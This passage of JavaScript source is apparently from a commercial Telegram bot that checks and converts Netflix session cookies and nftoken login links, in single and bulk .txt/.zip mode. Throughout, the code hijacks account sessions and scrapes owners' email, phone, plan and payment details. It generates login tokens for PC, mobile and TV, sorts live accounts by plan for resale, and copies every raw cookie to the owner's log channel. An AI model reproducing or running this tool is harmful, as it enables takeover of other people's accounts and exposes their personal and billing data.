        return ctx.reply("❌ *Akses Ditolak! Perintah ini khusus Owner.*", { parse_mode: 'Markdown' });
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply("⚠️ *Format Salah!*\n\nGunakan format:\n`/delvip @username` atau `/delvip ID_TELEGRAM`", { parse_mode: 'Markdown' });
    }

    let target = args[1].replace('@', '');
    let users = loadUsers();
    
    let userIndex = users.findIndex(u => 
        (u.username && u.username.replace('@', '').toLowerCase() === target.toLowerCase()) || 
        u.id.toString() === target
    );

    if (userIndex === -1) {
        return ctx.reply(`❌ *User tidak ditemukan di database!*`, { parse_mode: 'Markdown' });
    }

    // Hapus status VIP
    users[userIndex].isVip = false;
    delete users[userIndex].vipExpiredAt;
    fs.writeFileSync(USER_DB_FILE, JSON.stringify(users, null, 2));

    ctx.reply(`✅ <b>BERHASIL MENCABUT STATUS VIP!</b>\n──────────────────────────\n👤 <b>User:</b> <code>${users[userIndex].username}</code>\n🆔 <b>ID:</b> <code>${users[userIndex].id}</code>\n❌ Status VIP telah dihapus dari sistem.`, { parse_mode: 'HTML' });
});

bot.command('bc', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ *Akses Ditolak!*\nAnda bukan owner bot ini.", { parse_mode: 'Markdown' });
    const msgText = ctx.message.text.substring(3).trim(); 
    if (!msgText) return ctx.reply("❌ *Format Salah!*\nGunakan:\n`/bc Isi pesan broadcast di sini`", { parse_mode: 'Markdown' });
    const users = loadUsers();
    if (users.length === 0) return ctx.reply("❌ Tidak ada user terdaftar di database.");
    for (let userObj of users) {
        try { await ctx.telegram.sendMessage(userObj.id, msgText, { parse_mode: 'HTML' }); } catch (err) {}
    }
    ctx.reply("📢 Broadcast report sukses terkirim ke database.");
});

bot.command('catat', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ *Akses Khusus Owner CORVAST Store!*", { parse_mode: 'Markdown' });
    const args = ctx.message.text.substring(6).trim().split(/\s+/);
    if (args.length < 2) return ctx.reply("⚠️ <b>Format Salah!</b>\n\nGunakan:\n<code>/catat [ID/User/WA/Nama] [Durasi]</code>", { parse_mode: 'HTML' });
    const buyerInfo = args[0];
    const durationInput = args[1].toLowerCase();
    let days = 0;
    const matchDays = durationInput.match(/^(\d+)d$/);
    const matchMonths = durationInput.match(/^(\d+)(m|b)$/);
    if (matchDays) days = parseInt(matchDays[1]);
    else if (matchMonths) days = parseInt(matchMonths[1]) * 30;
    else return ctx.reply("⚠️ Format durasi tidak valid!", { parse_mode: 'HTML' });
    const expiredDate = new Date();
    expiredDate.setDate(expiredDate.getDate() + days);
    let pembeliList = loadPembeli();
    pembeliList.push({ buyer: buyerInfo, duration: durationInput, registeredAt: new Date().toISOString(), expiredAt: expiredDate.toISOString() });
    savePembeli(pembeliList);
    const tglExpiredStr = expiredDate.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' });
    ctx.reply(`✅ <b>BERHASIL MENCATAT BUYER!</b>\n───────────────────\n👤 <b>Buyer:</b> <code>${buyerInfo}</code>\n📅 <b>Jadwal Logout:</b> ${tglExpiredStr}`, { parse_mode: 'HTML' });
});

bot.command('ownerbulk', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ *Perintah ini eksklusif hanya untuk Owner CORVAST Store!*", { parse_mode: 'Markdown' });
    ctx.reply("📥 <b>Mode Owner Bulk Aktif!</b>\nSilakan lampirkan/drop file berkas <code>.txt</code> atau <code>.zip</code> berisi data cookies tanpa batasan kuantitas maksimal.", { parse_mode: 'HTML' });
    bot.context.ownerBulkWaiting = true; 
});

// 🌟 COMMAND PERINTAH /satukan UNTUK MENGGABUNGKAN COOKIES LIVE BERFORMAT BER-HEADER
bot.command('satukan', async (ctx) => {
    if (!(await isUserSubscribed(ctx))) return;

    const savedCookies = lastBulkResults.get(ctx.from.id);

    if (!savedCookies || savedCookies.length === 0) {
        return ctx.reply("⚠️ <b>Tidak ada data bulk terakhir yang tersimpan!</b>\n\nSilakan lakukan bulk check cookies (`.txt` / `.zip`) terlebih dahulu sebelum menggunakan perintah ini.", { parse_mode: 'HTML' });
    }

    const totalCount = savedCookies.length;
    const fileBuffer = Buffer.from(savedCookies.join('\n'), 'utf8');

    await ctx.replyWithDocument(
        { source: fileBuffer, filename: 'GABUNGAN_COOKIES_LIVE.txt' },
        { 
            caption: `📦 <b>BERHASIL MENSATUKAN COOKIES LIVE!</b>\n──────────────────────────\n🟢 <b>Total Cookies Gabungan:</b> <code>${totalCount} Akun</code>\n📌 <i>Seluruh cookies Premium, Standard, dan Basic disatukan berformat lengkap (Email : Plan : Region : Status : Cookies).</i>`, 
            parse_mode: 'HTML' 
        }
    );
});

bot.on('text', async (ctx) => {
    if (ctx.message.text.startsWith('/')) return;
    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    saveUser(ctx, ctx.from.id, userDisplay);
    const text = cleanCookieInput(ctx.message.text);
    if (!(await isUserSubscribed(ctx))) return;

    const rawText = ctx.message.text;
    
    // Mengecek mode user saat ini (default: Cookies to Link)
    const userCurrentMode = activeConvertModes.get(ctx.from.id) || 'COOKIES_TO_LINK';

    // =====================================================================
    // 🌟 ENGINE EKSTRAKSI UNTUK LINK NFTOKEN (LINK TO LINK & LINK TO COOKIES)
    // =====================================================================
    if (rawText.includes('netflix.com/') && rawText.includes('nftoken=')) {
        
        // Peringatan jika mode salah
        if (userCurrentMode === 'COOKIES_TO_LINK') {
            return ctx.reply("⚠️ <b>Mode Salah!</b>\nAnda mengirimkan Link Token Netflix, tetapi mode Anda saat ini adalah <b>Cookies to Link</b>.\n\n👉 <i>Silakan ubah mode menjadi 'Link to Link' atau 'Link to Cookies' melalui menu /start terlebih dahulu.</i>", { parse_mode: 'HTML', reply_to_message_id: ctx.message.message_id });
        }

        const urlMatch = rawText.match(/(https?:\/\/[^\s]+)/);
        if (!urlMatch) return ctx.reply("⚠️ Link tidak valid.");
        const targetUrl = urlMatch[1];

        const statusMsg = await ctx.reply("🔄 `Mengekstrak token Netflix dari tautan...`", { parse_mode: 'Markdown' });

        try {
            let currentUrl = targetUrl;
            let netflixId = '', secureNetflixId = '', nfvdid = '';
            let combinedCookies = '';
            let attempt = 0;

            while (attempt < 5) {
                const response = await axios.get(currentUrl, {
                    maxRedirects: 0,
                    validateStatus: (status) => status >= 200 && status <= 302,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Cookie': combinedCookies 
                    }
                });

                const setCookieHeaders = response.headers['set-cookie'];
                if (setCookieHeaders) {
                    setCookieHeaders.forEach(cookieStr => {
                        const cookiePart = cookieStr.split(';')[0];
                        const key = cookiePart.split('=')[0];
                        const val = cookiePart.substring(key.length + 1);

                        if (key === 'NetflixId') netflixId = val;
                        if (key === 'SecureNetflixId') secureNetflixId = val;
                        if (key === 'nfvdid') nfvdid = val;

                        combinedCookies += `${cookiePart}; `;
                    });
                }

                if (response.status === 301 || response.status === 302) {
                    currentUrl = response.headers.location;
                    if (!currentUrl.startsWith('http')) {
                        currentUrl = `https://www.netflix.com${currentUrl}`;
                    }
                    attempt++;
                } else {
                    break;
                }
            }

            if (!netflixId || !secureNetflixId) {
                await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, "❌ *Gagal Login!* Token sudah expired atau akun memang terdeteksi mati.", { parse_mode: 'Markdown' }).catch(()=>{});
                return;
            }

            const buildCookieData = `NetflixId=${netflixId}; SecureNetflixId=${secureNetflixId}; ${nfvdid ? 'nfvdid=' + nfvdid + ';' : ''}`;

            // LOGIC JIKA MODE ADALAH LINK TO COOKIES
            if (userCurrentMode === 'LINK_TO_COOKIES') {
                const resultText = `✅ successfully logged in and got account cookies!\n\n` +
                                   `📋 Detail Cookies:\n` +
                                   `<code>${buildCookieData}</code>\n\n` +
                                   `Thank you for using this bot, don't forget to follow @ByRhett`;

                await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, resultText, { parse_mode: 'HTML' }).catch(()=>{});
                return;
            }

            // LOGIC JIKA MODE ADALAH LINK TO LINK
            if (userCurrentMode === 'LINK_TO_LINK') {
                const infoResult = await checkAccountInfo(buildCookieData);
                
                if (infoResult.status === 'DEAD' || infoResult.status === 'ERROR') {
                    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `✅ Successfully logged in but data fetch blocked!\n\n<code>${buildCookieData}</code>`, { parse_mode: 'HTML' });
                    return;
                }

                let scrapedPhone = infoResult.apiPhone === 'Tidak Terdeteksi' ? await fetchPhoneNumberAPI(buildCookieData) : infoResult.apiPhone;
                const tokenResult = await generateNfToken(buildCookieData);
                
                const activeToken = tokenResult.success ? tokenResult.token : netflixId; 
                const tokenId = crypto.randomBytes(4).toString('hex');
                tokenCache.set(tokenId, { token: activeToken, createdAt: Date.now(), expiresAt: Date.now() + (60 * 60 * 1000) });
                setTimeout(() => tokenCache.delete(tokenId), 60 * 60 * 1000);

                const countryObj = getCountryDetail(infoResult.country);
                const countryTextFormat = `${countryObj.flag} ${countryObj.name}`;

                const linkLayoutResult = 
                    `📌 <b>NETFLIX ACCOUNT DATA FROM LINK</b>\n\n` +
                    `<blockquote>` +
                    `🚨 <b>Status:</b> ${infoResult.holdPaymentStatus}\n` +
                    `🌍 <b>Region:</b> ${countryTextFormat}\n` +
                    `📆 <b>Member Since:</b> ${infoResult.memberSince || 'Not Detected'}\n` +
                    `👑 <b>Plan:</b> ${infoResult.plan}\n` +
                    `💳 <b>Payment:</b> ${infoResult.payment}\n` +
                    `🗓️ <b>Next Billing:</b> ${infoResult.nextBill}\n` +
                    `🎭 <b>Profiles:</b> 👤 ${infoResult.profileNames}\n` +
                    `📩 <b>Email:</b> <code>${infoResult.email}</code>\n` +
                    `📱 <b>Phone:</b> <code>${scrapedPhone}</code>\n` +
                    `❌ <b>Extra Members:</b> ${infoResult.extraMember}\n` +

                    `</blockquote>\n` +
                    `🤖 <b>use the button below to enter and log in to your device:</b>`;

                await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
                
                await ctx.reply(linkLayoutResult, {
                    parse_mode: 'HTML',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('💻 PC', `copy_pc_${tokenId}`), Markup.button.callback('📱 MOBILE', `copy_app_${tokenId}`)],
                        [Markup.button.callback('📺 TV', `copy_tv_${tokenId}`)]
                    ])
                });
                return;
            }
        } catch (error) {
            await ctx.reply(`⚠️ System eror ip bot di blokir netflix. hatap jeda terlebih dahulu jangan di spam : ${error.message}`, { parse_mode: 'Markdown' }).catch(()=>{});
            return;
        }
    }
    // =====================================================================

    // JIKA BUKAN LINK, PASTIKAN MODE ADALAH COOKIES TO LINK
    if (userCurrentMode !== 'COOKIES_TO_LINK') {
        const activeModeFormatted = userCurrentMode.replace(/_/g, ' ');
        return ctx.reply(`⚠️ <b>Mode Salah!</b>\nAnda mengirimkan data format Cookies, tetapi mode Anda saat ini adalah <b>${activeModeFormatted}</b>.\n\n👉 <i>Silakan ubah mode menjadi 'Cookies to Link' melalui menu /start terlebih dahulu.</i>`, { parse_mode: 'HTML', reply_to_message_id: ctx.message.message_id });
    }

    const isJsonFormat = text.trim().startsWith('[') || text.trim().startsWith('{');
    const isNetscapeFormat = text.includes('.netflix.com');
    const isCustomTextFormat = text.includes('NetflixId:') || text.includes('NetflixId=');

    if (!isJsonFormat && !isNetscapeFormat && !isCustomTextFormat && (text.includes('┃') || text.includes('|'))) {
        return ctx.reply("⚠️ <b>Kirim bagian cookies saja!</b>", { parse_mode: 'HTML', reply_to_message_id: ctx.message.message_id });
    }

    let cookieDict = parseCookies(text);
    if (!cookieDict['NetflixId']) {
        const backupExtract = extractCookiesFromRawText(text);
        if (backupExtract.length > 0) cookieDict = parseCookies(backupExtract[0]);
    }

    if (!cookieDict['NetflixId']) return ctx.reply("⚠️ Format cookies tidak dikenali atau NetflixId tidak ditemukan.", { reply_to_message_id: ctx.message.message_id });

    const startTime = Date.now();
    const msg = await ctx.reply("⏳ `[1/3] Connecting to secure Netflix core...`", { parse_mode: 'Markdown' });
    const cookieString = buildCookieString(cookieDict);
    const textData = parseTextData(text);
    const infoResult = await checkAccountInfo(cookieString);

    if (infoResult.status === 'DEAD') return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `❌ *STATUS: EXPIRED / INVALID*\nCookie data is no longer valid.`, { parse_mode: 'Markdown' });
    if (infoResult.status === 'ERROR') return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `⚠️ *CONNECTION ERROR*\nDisconnect: ${infoResult.message}`, { parse_mode: 'Markdown' });

    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, "⚙️ `[2/3] Extracting profile credentials...`", { parse_mode: 'Markdown' });
    let scrapedPhone = infoResult.apiPhone === 'Tidak Terdeteksi' ? await fetchPhoneNumberAPI(cookieString) : infoResult.apiPhone;

    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, "🚀 `[3/3] Finalizing secure token encryptions...`", { parse_mode: 'Markdown' });
    const tokenResult = await generateNfToken(cookieString);
    if (!tokenResult.success) return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `⚠️ *COOKIES DEAD*\nSILAHKAN GANTI COOKIES LAIN`, { parse_mode: 'Markdown' });

    addConvertScore(ctx.from.id, 1);
    const finalPhone = scrapedPhone !== 'Tidak Terdeteksi' ? scrapedPhone : (textData.phone || 'Tidak Terdeteksi');
    const finalEmail = infoResult.email !== 'Not Detected' ? infoResult.email : (textData.email || 'Not Detected');
    const finalPlan = infoResult.plan !== 'Not Detected' ? infoResult.plan : (textData.plan || 'Not Detected');
    const finalRegion = infoResult.country !== 'Not Detected' ? infoResult.country : (textData.region || 'Not Detected');
    const finalPayment = infoResult.payment !== 'Not Detected' ? infoResult.payment : (textData.payment || 'Not Detected');
    const finalNextBill = infoResult.nextBill !== 'Not Detected' ? infoResult.nextBill : 'Not Detected';
    const finalMemberSince = infoResult.memberSince !== 'Not Detected' ? infoResult.memberSince : 'Not Detected';
    
    const countryObj = getCountryDetail(finalRegion);
    const countryTextFormat = `${countryObj.flag} ${countryObj.name}`;
    const finalAccStatus = infoResult.holdPaymentStatus; 

    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    const tokenId = crypto.randomBytes(4).toString('hex');
    tokenCache.set(tokenId, { token: tokenResult.token, createdAt: Date.now(), expiresAt: Date.now() + (60 * 60 * 1000) });
    setTimeout(() => tokenCache.delete(tokenId), 60 * 60 * 1000);

    logToPanel('SATUAN', { name: ctx.from.first_name, username: userDisplay, id: ctx.from.id, email: finalEmail, country: countryObj.name, language: infoResult.language, duration: duration });

    const now = new Date();
    const tglCek = now.toLocaleDateString('id-ID', { day: 'numeric', month: 'numeric', year: 'numeric' });
    const jamCek = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'Asia/Jakarta' });

    const cardLayout = 
        `🚨 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐁𝐘𝐏𝐀𝐒𝐒𝐄𝐃 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐀𝐂𝐂𝐎𝐔𝐍𝐓, 𝐘𝐎𝐔𝐑 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐃𝐄𝐓𝐀𝐈𝐋𝐒 𝐀𝐑𝐄 𝐁𝐄𝐋𝐎𝐖 :\n\n` +
        `<blockquote>` +
        `🟢 <b>Status:</b> ${finalAccStatus}\n` +
        `📩 <b>Email:</b> <code>${finalEmail}</code>\n` +
        `📱 <b>Phone:</b> <code>${finalPhone}</code>\n` +
        `👑 <b>Plan:</b> ${finalPlan}\n` +
        `💳 <b>Payment:</b> ${finalPayment}\n` +
        `📆 <b>Member Since:</b> ${finalMemberSince}\n` +
        `🗓️ <b>Next Billing:</b> ${finalNextBill}\n` +
        `🌍 <b>Country:</b> ${countryTextFormat}\n` +
        `🛡️ <b>Jaringan:</b> <b>${infoResult.userUsingVPN}</b>\n` +
        `🎭 <b>Profiles:</b> 👤 ${infoResult.profileNames}\n` +
        `📅 <b>Tanggal Cek:</b> ${tglCek}, ${jamCek} WIB\n` +
        `⚡ <b>Kecepatan:</b> ${duration} detik/cookie` +
        `</blockquote>\n` +
        `──────── ⋆⋅☆⋅⋆ ────────\n` +
        `🕸️ Thank you for using this conversion bot 🕷️\n\n` +
        `"𝗔𝗡𝗡𝗢𝗨𝗡𝗖𝗘𝗠𝗘𝗡𝗧"\n` +
        `⛥ Rating pengerjaan bot ini untuk memberikan feedback kepada pengembang - bebas request fitur - pendapatmu berharga bagi kami.\n` +
        ``;

    try {
        const logLayout = `📢 <b>NEW CONVERT LOG (SATUAN)</b>\n` +
                          `👤 <b>User:</b> ${userDisplay} (<code>${ctx.from.id}</code>)\n\n` + 
                          cardLayout + 
                          `\n\n🔑 <b>Raw Cookie Data:</b>\n<code>${cookieString}</code>`;
        
        await ctx.telegram.sendMessage(LOG_CHANNEL_ID, logLayout, { parse_mode: 'HTML', disable_web_page_preview: true });
    } catch (logErr) {
        console.error("⚠️ Gagal mengirim log convert satuan ke channel:", logErr.message);
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});

    // 1. Kirim Foto dengan Caption Pendek (Aman dari limit batas Telegram)
    await ctx.replyWithPhoto('https://ibb.co.com/ymDYRmKF', {
        caption: `🚨 <b>SUCCESSFULLY BYPASSED NETFLIX ACCOUNT</b>\n\n🟢 <b>Status:</b> ${finalAccStatus}\n📩 <b>Email:</b> <code>${finalEmail}</code>\n👑 <b>Plan:</b> ${finalPlan}\n🌍 <b>Country:</b> ${countryTextFormat}\n⚡ <b>Kecepatan:</b> ${duration} detik/cookie\n\n👇 <i>Detail lengkap akun dan tombol login ada di bawah ini:</i>`,
        parse_mode: 'HTML'
    });

    // 2. Kirim Detail Lengkap Berserta Tombol Interaktif Secara Terpisah
    await ctx.reply(cardLayout, {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('📱 MOBILE', `copy_app_${tokenId}`), Markup.button.callback('💻 PC', `copy_pc_${tokenId}`)],
            [Markup.button.callback('📺 TV ', `copy_tv_${tokenId}`)]
        ])
    });
});

bot.on('document', async (ctx) => {
    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    saveUser(ctx, ctx.from.id, userDisplay);
    
    const isOwnerAction = (ctx.from.id === OWNER_ID && bot.context.ownerBulkWaiting === true);
    if (!isOwnerAction && !(await isUserSubscribed(ctx))) return;

    const doc = ctx.message.document || ctx.update?.message?.document;
    if (!doc) return ctx.reply("⚠️ Gagal memproses file. Dokumen tidak terdeteksi.");

    const nameOfFile = doc.file_name || doc.fileName || '';
    const isZip = nameOfFile.toLowerCase().endsWith('.zip');
    const isTxt = nameOfFile.toLowerCase().endsWith('.txt');

    if (!isZip && !isTxt) {
        return ctx.reply("⚠️ Sistem hanya mendukung lampiran dokumen dengan format file .txt atau .zip untuk pemrosesan massal.");
    }

    const realFileId = doc.file_id || doc.fileId;
    const statusMsg = await ctx.reply(`⏳ <code>[Bulk Core] Mengunduh dan menganalisis berkas database cookies... (${isZip ? 'ZIP PACKAGE MODE' : 'TXT MODE'})</code>`, { parse_mode: 'HTML' });
    
    try {
        const fileData = await ctx.telegram.getFile(realFileId);
        const downloadUrl = `https://api.telegram.org/file/bot${bot.telegram.token}/${fileData.file_path}`;

        const userCurrentMode = activeConvertModes.get(ctx.from.id) || 'COOKIES_TO_LINK';

        // =====================================================================
        // 🌟 FITUR BULK CONVERT LINK TO COOKIES
        // =====================================================================
        if (isTxt && userCurrentMode === 'LINK_TO_COOKIES') {
            const txtResponse = await axios.get(downloadUrl, { responseType: 'text', timeout: 25000 });
            const fileContent = cleanCookieInput(txtResponse.data);
            const linksToProcess = extractLinksFromText(fileContent);

            if (linksToProcess.length === 0) {
                bot.context.ownerBulkWaiting = false;
                return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, "❌ Tidak ditemukan link login Netflix yang valid di dalam file.");
            }

            if (!isOwnerAction && linksToProcess.length > 30) {
                return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `❌ <b>AKSES BULK DITOLAK!</b>\n\nMaksimal antrean user adalah <b>30 Link</b>.\nFile Anda berisi: <code>${linksToProcess.length} Link</code>.`, { parse_mode: 'HTML' });
            }

            let liveCookiesResults = [];
            let deadLinksResults = [];
            let index = 0, totalLinks = linksToProcess.length, lastUpdateTime = Date.now();

            const formatProgressBar = (current, total) => {
                const percentage = Math.round((current / total) * 100);
                const filledBars = Math.round((percentage / 100) * 12);
                return `⚙️ <b>[${'▓'.repeat(filledBars)}${'░'.repeat(12 - filledBars)}] ${percentage}%</b>\n⏳ <code>Memproses link ke cookies: ${current}/${total} Link...</code>`;
            };

            const processLinkWorker = async (link) => {
                const cookieResult = await resolveLinkToCookie(link);
                if (cookieResult) {
                    liveCookiesResults.push(cookieResult);
                } else {
                    deadLinksResults.push(link);
                }
                index++;
                if (Date.now() - lastUpdateTime > 2200 || index === totalLinks) {
                    lastUpdateTime = Date.now();
                    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, formatProgressBar(index, totalLinks), { parse_mode: 'HTML' }).catch(() => {});
                }
            };

            const CONCURRENCY = isOwnerAction ? 6 : 4;
            for (let i = 0; i < linksToProcess.length; i += CONCURRENCY) {
                const chunk = linksToProcess.slice(i, i + CONCURRENCY);
                await Promise.all(chunk.map(l => processLinkWorker(l)));
            }

            await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
            
            if (liveCookiesResults.length > 0 && !isOwnerAction) {
                addConvertScore(ctx.from.id, liveCookiesResults.length);
            }

            // SIMPAN HASIL LINK TO COOKIES KE MEMORI SUPAYA BISA DIGUNAKAN COMMAND /satukan
            lastBulkResults.set(ctx.from.id, liveCookiesResults);

            const summaryText = `<b>📊 BULK CONVERT LINK TO COOKIES COMPLETED</b>\n─────────────────────\n🟢 <b>Berhasil Konversi:</b> ${liveCookiesResults.length} Cookies\n🔴 <b>Gagal/Expired:</b> ${deadLinksResults.length} Link\n📦 <b>Total Diproses:</b> ${linksToProcess.length}`;
            await ctx.reply(summaryText, { parse_mode: 'HTML' });

            try {
                const bulkLogText = `📢 <b>NEW CONVERT LOG (BULK LINK TO COOKIES)</b>\n👤 <b>Operator:</b> ${userDisplay}\n📦 <b>File Asal:</b> <code>${nameOfFile}</code>\n\n` + summaryText;
                await ctx.telegram.sendMessage(LOG_CHANNEL_ID, bulkLogText, { parse_mode: 'HTML' });
            } catch (logErr) {
                console.error("⚠️ Gagal mengirim log convert link to cookies ke channel log:", logErr.message);
            }

            if (liveCookiesResults.length > 0) {
                await ctx.replyWithDocument({ source: Buffer.from(liveCookiesResults.join('\n'), 'utf8'), filename: 'CONVERTED_COOKIES.txt' }, { caption: `🍪 <b>Berhasil Konversi (${liveCookiesResults.length} Cookies)</b>`, parse_mode: 'HTML' }).catch(() => {});
            }
            if (deadLinksResults.length > 0) {
                await ctx.replyWithDocument({ source: Buffer.from(deadLinksResults.join('\n'), 'utf8'), filename: 'FAILED_LINKS.txt' }, { caption: `❌ <b>Link Gagal/Expired (${deadLinksResults.length} Link)</b>`, parse_mode: 'HTML' }).catch(() => {});
            }

            bot.context.ownerBulkWaiting = false;
            return;
        }

        let cookiesToProcess = [];

        if (isZip) {
            const zipResponse = await axios.get(downloadUrl, { responseType: 'arraybuffer', timeout: 35000 });
            const zip = new AdmZip(Buffer.from(zipResponse.data));
            const zipEntries = zip.getEntries();

            zipEntries.forEach(entry => {
                if (!entry.isDirectory && entry.entryName.toLowerCase().endsWith('.txt') && !entry.entryName.includes('__MACOSX')) {
                    const txtContent = cleanCookieInput(entry.getData().toString('utf8'));
                    const extracted = extractCookiesFromRawText(txtContent);
                    cookiesToProcess = cookiesToProcess.concat(extracted);
                }
            });
        } else {
            const txtResponse = await axios.get(downloadUrl, { responseType: 'text', timeout: 25000 });
            const fileContent = cleanCookieInput(txtResponse.data);
            cookiesToProcess = extractCookiesFromRawText(fileContent);
        }

        if (cookiesToProcess.length === 0) {
            bot.context.ownerBulkWaiting = false;
            return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, "❌ Struktur format atau database cookies di dalam file tidak ditemukan.");
        }

        if (!isOwnerAction && cookiesToProcess.length > 30) {
            return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `❌ <b>AKSES BULK DITOLAK!</b>\n\nMaksimal antrean user adalah <b>30 Cookies</b>.\nFile Anda berisi: <code>${cookiesToProcess.length} Cookies</code>.`, { parse_mode: 'HTML' });
        }

        let premiumResults = [], standardResults = [], basicResults = [], holdPaymentResults = [], memberCancelResults = [], otherLiveResults = [], deadResults = [];
        let formattedLiveCookiesForMerge = []; // 🌟 PENAMPUNG BARIS COOKIES BERFORMAT LENGKAP UNTUK /satukan
        let index = 0, totalCookies = cookiesToProcess.length, lastUpdateTime = Date.now();

        const formatProgressBar = (current, total) => {
            const percentage = Math.round((current / total) * 100);
            const filledBars = Math.round((percentage / 100) * 12);
            return `⚙️ <b>[${'▓'.repeat(filledBars)}${'░'.repeat(12 - filledBars)}] ${percentage}%</b>\n⏳ <code>Memproses: ${current}/${total} Cookies...</code>`;
        };

        const processCookieWorker = async (rawCookieData) => {
            const cookieDict = parseCookies(rawCookieData);
            if (!cookieDict['NetflixId']) { deadResults.push(rawCookieData); index++; return; }

            const cookieString = buildCookieString(cookieDict);
            const infoResult = await checkAccountInfo(cookieString);

            if (infoResult && infoResult.status === 'LIVE' && infoResult.plan !== 'Not Detected') {
                const textData = parseTextData(rawCookieData);
                const finalEmail = infoResult.email !== 'Not Detected' ? infoResult.email : (textData.email || 'UnknownEmail');
                const finalPlan = infoResult.plan;
                const finalRegion = infoResult.country !== 'Not Detected' ? infoResult.country : (textData.region || 'Not Detected');
                
                const watchStatusText = infoResult.watchStatus || "✅ Unlocked Region (Bebas VPN)";
                const bulkVPN = watchStatusText.includes("Geo-Lock") ? "GEO-LOCK" : "UNLOCKED";
                
                const countryObj = getCountryDetail(finalRegion);
                const accountStatusText = infoResult.holdPaymentStatus;

                // Format baris lengkap sesuai foto (Email : Plan : Region : Status : Cookies)
                const formattedLine = `${finalEmail} : ${finalPlan} : ${countryObj.flag} ${countryObj.name} (${bulkVPN}) : Status: ${accountStatusText} : ${cookieString}`;
                
                if (accountStatusText.includes('HOLD') || accountStatusText.includes('SUSPENDED')) {
                    holdPaymentResults.push(formattedLine);
                } else if (accountStatusText.includes('CANCEL')) {
                    memberCancelResults.push(formattedLine);
                } else {
                    // 🌟 SIMPAN BARIS BERFORMAT LENGKAP UNTUK COMMAND /satukan
                    formattedLiveCookiesForMerge.push(formattedLine);

                    const lowerPlan = finalPlan.toLowerCase();
                    if (lowerPlan.includes('prem') || lowerPlan.includes('4k') || lowerPlan.includes('cao cấp') || lowerPlan.includes('özel')) premiumResults.push(formattedLine);
                    else if (lowerPlan.includes('stan') || lowerPlan.includes('tiêu chuẩn')) standardResults.push(formattedLine);
                    else if (lowerPlan.includes('bas') || lowerPlan.includes('temel') || lowerPlan.includes('cơ bản')) basicResults.push(formattedLine);
                    else otherLiveResults.push(formattedLine);
                }
            } else {
                const deadDict = parseCookies(rawCookieData);
                const deadCookieStr = buildCookieString(deadDict);
                const finalEmail = parseTextData(rawCookieData).email || 'UnknownEmail';
                deadResults.push(deadCookieStr ? `${finalEmail} : DEAD : ${deadCookieStr}` : rawCookieData);
            }

            index++;
            if (Date.now() - lastUpdateTime > 2200 || index === totalCookies) {
                lastUpdateTime = Date.now();
                await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, formatProgressBar(index, totalCookies), { parse_mode: 'HTML' }).catch(() => {});
            }
        };

        const CONCURRENCY = isOwnerAction ? 6 : 4; 
        for (let i = 0; i < cookiesToProcess.length; i += CONCURRENCY) {
            const chunk = cookiesToProcess.slice(i, i + CONCURRENCY);
            await Promise.all(chunk.map(c => processCookieWorker(c)));
        }

        await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
        const totalLive = premiumResults.length + standardResults.length + basicResults.length + otherLiveResults.length + holdPaymentResults.length + memberCancelResults.length;
        if (totalLive > 0 && !isOwnerAction) addConvertScore(ctx.from.id, totalLive);

        // 🌟 SIMPAN HASIL BARIS BERFORMAT KE MEMORI UNTUK FITUR /satukan
        lastBulkResults.set(ctx.from.id, formattedLiveCookiesForMerge);

        logToPanel('BULK', { name: ctx.from.first_name, username: userDisplay, fileName: nameOfFile, total: cookiesToProcess.length, live: totalLive, dead: deadResults.length });

